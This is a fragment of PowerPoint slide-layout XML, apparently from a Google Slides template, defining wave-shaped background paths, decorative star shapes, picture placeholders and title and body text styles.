        <p:nvGrpSpPr>
          <p:cNvPr id="10" name="Google Shape;10;p2"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="-396402" y="-536388"/>
            <a:ext cx="9936804" cy="6150201"/>
            <a:chOff x="-396402" y="-536388"/>
            <a:chExt cx="9936804" cy="6150201"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="11" name="Google Shape;11;p2"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5188502" y="3870002"/>
              <a:ext cx="4144196" cy="1743811"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="67985" h="28607" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="65362" y="0"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="62926" y="0"/>
                    <a:pt x="60336" y="1525"/>
                    <a:pt x="58411" y="3232"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="55768" y="5592"/>
                    <a:pt x="53139" y="8519"/>
                    <a:pt x="49600" y="8743"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="49451" y="8753"/>
                    <a:pt x="49303" y="8758"/>
                    <a:pt x="49156" y="8758"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="45971" y="8758"/>
                    <a:pt x="42955" y="6603"/>
                    <a:pt x="39809" y="6603"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="39504" y="6603"/>
                    <a:pt x="39199" y="6623"/>
                    <a:pt x="38891" y="6667"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="35755" y="7115"/>
                    <a:pt x="33515" y="9893"/>
                    <a:pt x="30632" y="11178"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="29067" y="11873"/>
                    <a:pt x="27423" y="12099"/>
                    <a:pt x="25737" y="12099"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="22587" y="12099"/>
                    <a:pt x="19287" y="11309"/>
                    <a:pt x="16067" y="11309"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="15568" y="11309"/>
                    <a:pt x="15071" y="11328"/>
                    <a:pt x="14577" y="11372"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="6498" y="12074"/>
                    <a:pt x="1" y="20617"/>
                    <a:pt x="1494" y="28607"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="66775" y="25650"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="67985" y="708"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="67160" y="213"/>
                    <a:pt x="66272" y="0"/>
                    <a:pt x="65362" y="0"/>
                  </a:cubicBezTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="D6E6EB">
                <a:alpha val="525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5397121" y="-536388"/>
              <a:ext cx="4143281" cy="1743445"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="67970" h="28601" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="1479" y="0"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="1" y="7976"/>
                    <a:pt x="6482" y="16518"/>
                    <a:pt x="14577" y="17235"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="15058" y="17277"/>
                    <a:pt x="15542" y="17295"/>
                    <a:pt x="16027" y="17295"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="19245" y="17295"/>
                    <a:pt x="22549" y="16505"/>
                    <a:pt x="25705" y="16505"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="27397" y="16505"/>
                    <a:pt x="29046" y="16732"/>
                    <a:pt x="30617" y="17429"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="33500" y="18714"/>
                    <a:pt x="35740" y="21492"/>
                    <a:pt x="38876" y="21940"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="39182" y="21984"/>
                    <a:pt x="39486" y="22004"/>
                    <a:pt x="39789" y="22004"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="42938" y="22004"/>
                    <a:pt x="45956" y="19835"/>
                    <a:pt x="49143" y="19835"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="49290" y="19835"/>
                    <a:pt x="49437" y="19839"/>
                    <a:pt x="49584" y="19849"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="53124" y="20073"/>
                    <a:pt x="55768" y="23000"/>
                    <a:pt x="58411" y="25360"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="60333" y="27075"/>
                    <a:pt x="62909" y="28601"/>
                    <a:pt x="65337" y="28601"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="66250" y="28601"/>
                    <a:pt x="67141" y="28385"/>
                    <a:pt x="67969" y="27884"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="66760" y="2957"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1479" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="D6E6EB">
                <a:alpha val="525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396402" y="-536388"/>
              <a:ext cx="4144196" cy="1743445"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="67985" h="28601" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="66491" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1210" y="2958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="27884"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="829" y="28386"/>
                    <a:pt x="1721" y="28601"/>
                    <a:pt x="2635" y="28601"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="5068" y="28601"/>
                    <a:pt x="7652" y="27075"/>
                    <a:pt x="9574" y="25360"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="12217" y="23015"/>
                    <a:pt x="14846" y="20073"/>
                    <a:pt x="18386" y="19849"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="18525" y="19840"/>
                    <a:pt x="18664" y="19836"/>
                    <a:pt x="18803" y="19836"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="21997" y="19836"/>
                    <a:pt x="25021" y="22004"/>
                    <a:pt x="28177" y="22004"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="28481" y="22004"/>
                    <a:pt x="28787" y="21984"/>
                    <a:pt x="29094" y="21940"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="32230" y="21492"/>
                    <a:pt x="34470" y="18714"/>
                    <a:pt x="37353" y="17429"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="38924" y="16732"/>
                    <a:pt x="40573" y="16505"/>
                    <a:pt x="42266" y="16505"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="45422" y="16505"/>
                    <a:pt x="48729" y="17295"/>
                    <a:pt x="51954" y="17295"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="52441" y="17295"/>
                    <a:pt x="52926" y="17277"/>
                    <a:pt x="53408" y="17235"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="61488" y="16518"/>
                    <a:pt x="67984" y="7991"/>
                    <a:pt x="66491" y="0"/>
                  </a:cubicBezTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="D6E6EB">
                <a:alpha val="525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484975" y="-235697"/>
            <a:ext cx="8659031" cy="2471548"/>
            <a:chOff x="484975" y="-235697"/>
            <a:chExt cx="8659031" cy="2471548"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="15" name="Google Shape;15;p2"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="484975" y="599300"/>
              <a:ext cx="228254" cy="228296"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="3719" h="3720" fill="none" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="1867"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="1195" y="2226"/>
                    <a:pt x="1494" y="2509"/>
                    <a:pt x="1852" y="3719"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="2211" y="2509"/>
                    <a:pt x="2509" y="2226"/>
                    <a:pt x="3719" y="1867"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="2509" y="1494"/>
                    <a:pt x="2211" y="1210"/>
                    <a:pt x="1852" y="0"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="1494" y="1210"/>
                    <a:pt x="1195" y="1494"/>
                    <a:pt x="0" y="1867"/>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5922903">
              <a:off x="7087076" y="239811"/>
              <a:ext cx="2267335" cy="1520533"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="62892" h="42177" fill="none" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="1" y="42176"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="1838" y="37352"/>
                    <a:pt x="3675" y="32513"/>
                    <a:pt x="6273" y="28078"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="8887" y="23627"/>
                    <a:pt x="12337" y="19565"/>
                    <a:pt x="16773" y="16966"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="19401" y="15413"/>
                    <a:pt x="23000" y="14487"/>
                    <a:pt x="25345" y="16443"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="27571" y="18295"/>
                    <a:pt x="27451" y="21925"/>
                    <a:pt x="25928" y="24389"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="24584" y="26554"/>
                    <a:pt x="21522" y="28137"/>
                    <a:pt x="19536" y="26539"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="17594" y="24956"/>
                    <a:pt x="18430" y="21686"/>
                    <a:pt x="20208" y="19923"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="22836" y="17295"/>
                    <a:pt x="26824" y="16518"/>
                    <a:pt x="30543" y="16533"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="34276" y="16563"/>
                    <a:pt x="37980" y="17265"/>
                    <a:pt x="41699" y="17071"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="51377" y="16563"/>
                    <a:pt x="60338" y="9349"/>
                    <a:pt x="62892" y="0"/>
                  </a:cubicBezTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="19050" cap="rnd"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17;p2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123200" y="1378950"/>
            <a:ext cx="6745200" cy="1483529"/>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4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
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Picture 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F9C8F8E-AE77-AEEA-2CC5-72BF2EB24B28}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8011329" y="40875"/>
            <a:ext cx="1120619" cy="498675"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Picture 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B1EB6C48-3B3E-9388-9F86-BEA01E2BBC6F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7665667" y="4495799"/>
            <a:ext cx="1554058" cy="604529"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="25" name="Google Shape;25;p4"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="-43885"/>
            <a:ext cx="9143998" cy="5231259"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Google Shape;26;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6962775" y="3809999"/>
            <a:ext cx="2421038" cy="1514747"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="67985" h="28608" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="2624" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="1714" y="0"/>
                  <a:pt x="825" y="213"/>
                  <a:pt x="1" y="709"/>
                </a:cubicBezTo>
                <a:lnTo>
                  <a:pt x="1225" y="25635"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="66491" y="28607"/>
                </a:lnTo>
                <a:cubicBezTo>
                  <a:pt x="67984" y="20617"/>
                  <a:pt x="61488" y="12074"/>
                  <a:pt x="53408" y="11372"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="52914" y="11328"/>
                  <a:pt x="52417" y="11309"/>
                  <a:pt x="51918" y="11309"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="48698" y="11309"/>
                  <a:pt x="45399" y="12100"/>
                  <a:pt x="42248" y="12100"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="40562" y="12100"/>
                  <a:pt x="38919" y="11873"/>
                  <a:pt x="37353" y="11178"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="34471" y="9894"/>
                  <a:pt x="32230" y="7116"/>
                  <a:pt x="29094" y="6668"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="28787" y="6623"/>
                  <a:pt x="28481" y="6603"/>
                  <a:pt x="28177" y="6603"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="25030" y="6603"/>
                  <a:pt x="22014" y="8758"/>
                  <a:pt x="18830" y="8758"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="18682" y="8758"/>
                  <a:pt x="18534" y="8753"/>
                  <a:pt x="18386" y="8744"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="14846" y="8520"/>
                  <a:pt x="12217" y="5592"/>
                  <a:pt x="9574" y="3233"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="7649" y="1525"/>
                  <a:pt x="5060" y="0"/>
                  <a:pt x="2624" y="0"/>
                </a:cubicBezTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="D6E6EB">
              <a:alpha val="525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28;p4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="719999" y="146672"/>
            <a:ext cx="7704000" cy="541344"/>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800" b="1">
                <a:solidFill>
                  <a:srgbClr val="002060"/>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dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Google Shape;29;p4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="825388"/>
            <a:ext cx="7704000" cy="3778562"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="91425" rIns="91425" bIns="91425" anchor="t" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="139700" lvl="0" indent="0" algn="just" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="accent1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr sz="1600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>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dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E4287DB7-C23A-B648-E690-BF9613457D2E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr userDrawn="1"/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7200891" y="-181258"/>
            <a:ext cx="2143141" cy="130969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5"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="46" name="Google Shape;46;p8"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="-43885"/>
            <a:ext cx="9143998" cy="5231259"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Google Shape;47;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5188502" y="3870002"/>
            <a:ext cx="4144196" cy="1743811"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="67985" h="28607" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="65362" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="62926" y="0"/>
                  <a:pt x="60336" y="1525"/>
                  <a:pt x="58411" y="3232"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="55768" y="5592"/>
                  <a:pt x="53139" y="8519"/>
                  <a:pt x="49600" y="8743"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="49451" y="8753"/>
                  <a:pt x="49303" y="8758"/>
                  <a:pt x="49156" y="8758"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="45971" y="8758"/>
                  <a:pt x="42955" y="6603"/>
                  <a:pt x="39809" y="6603"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="39504" y="6603"/>
                  <a:pt x="39199" y="6623"/>
                  <a:pt x="38891" y="6667"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="35755" y="7115"/>
                  <a:pt x="33515" y="9893"/>
                  <a:pt x="30632" y="11178"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="29067" y="11873"/>
                  <a:pt x="27423" y="12099"/>
                  <a:pt x="25737" y="12099"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="22587" y="12099"/>
                  <a:pt x="19287" y="11309"/>
                  <a:pt x="16067" y="11309"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="15568" y="11309"/>
                  <a:pt x="15071" y="11328"/>
                  <a:pt x="14577" y="11372"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="6498" y="12074"/>
                  <a:pt x="1" y="20617"/>
                  <a:pt x="1494" y="28607"/>
                </a:cubicBezTo>
                <a:lnTo>
                  <a:pt x="66775" y="25650"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="67985" y="708"/>
                </a:lnTo>
                <a:cubicBezTo>
                  <a:pt x="67160" y="213"/>
                  <a:pt x="66272" y="0"/>
                  <a:pt x="65362" y="0"/>
                </a:cubicBezTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="D6E6EB">
              <a:alpha val="525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8"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1768550" y="1307100"/>
            <a:ext cx="56070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a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-25" y="-13725"/>
            <a:ext cx="9144000" cy="5157300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="Google Shape;56;p10"/>
          <p:cNvSpPr txBox="1">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pic>
        <p:nvPicPr>
          <p:cNvPr id="58" name="Google Shape;58;p11"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="-43885"/>
            <a:ext cx="9143998" cy="5231259"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="Google Shape;59;p11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5188502" y="3870002"/>
            <a:ext cx="4144196" cy="1743811"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="67985" h="28607" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="65362" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="62926" y="0"/>
                  <a:pt x="60336" y="1525"/>
                  <a:pt x="58411" y="3232"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="55768" y="5592"/>
                  <a:pt x="53139" y="8519"/>
                  <a:pt x="49600" y="8743"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="49451" y="8753"/>
                  <a:pt x="49303" y="8758"/>
                  <a:pt x="49156" y="8758"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="45971" y="8758"/>
                  <a:pt x="42955" y="6603"/>
                  <a:pt x="39809" y="6603"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="39504" y="6603"/>
                  <a:pt x="39199" y="6623"/>
                  <a:pt x="38891" y="6667"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="35755" y="7115"/>
                  <a:pt x="33515" y="9893"/>
                  <a:pt x="30632" y="11178"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="29067" y="11873"/>
                  <a:pt x="27423" y="12099"/>
                  <a:pt x="25737" y="12099"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="22587" y="12099"/>
                  <a:pt x="19287" y="11309"/>
                  <a:pt x="16067" y="11309"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="15568" y="11309"/>
                  <a:pt x="15071" y="11328"/>
                  <a:pt x="14577" y="11372"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="6498" y="12074"/>
                  <a:pt x="1" y="20617"/>
                  <a:pt x="1494" y="28607"/>
                </a:cubicBezTo>
                <a:lnTo>
                  <a:pt x="66775" y="25650"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="67985" y="708"/>
                </a:lnTo>
                <a:cubicBezTo>
                  <a:pt x="67160" y="213"/>
                  <a:pt x="66272" y="0"/>
                  <a:pt x="65362" y="0"/>
                </a:cubicBezTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="D6E6EB">
              <a:alpha val="525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1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1284000" y="1057549"/>
            <a:ext cx="6576000" cy="17163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1" name="Google Shape;61;p11"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1284000" y="2774099"/>
            <a:ext cx="6576000" cy="497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2"/>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3"/>
